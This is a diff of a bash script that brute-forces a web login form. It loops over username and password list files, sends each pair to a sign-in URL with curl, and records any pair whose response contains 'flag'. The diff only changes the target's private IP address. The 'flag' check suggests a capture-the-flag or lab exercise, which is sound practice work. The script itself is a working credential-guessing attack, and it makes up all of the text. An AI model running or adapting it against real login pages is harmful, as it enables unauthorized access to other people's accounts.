@@ -2,7 +2,7 @@ for user in $(cat username.txt)
 do
 	for pass in $(cat passlist.txt)
 	do
-		flag=$(curl -s -X GET  "http://10.13.0.11/?page=signin&username=${user}&password=${pass}&Login=Login" | grep 'flag')
+		flag=$(curl -s -X GET  "http://192.168.0.15/?page=signin&username=${user}&password=${pass}&Login=Login" | grep 'flag')
 		if [ "${flag}" ]; then
 			echo "SUCCESS: username: ${user}, password: ${pass}"
 			echo "username: ${user}, password: ${pass}" >> brutelist
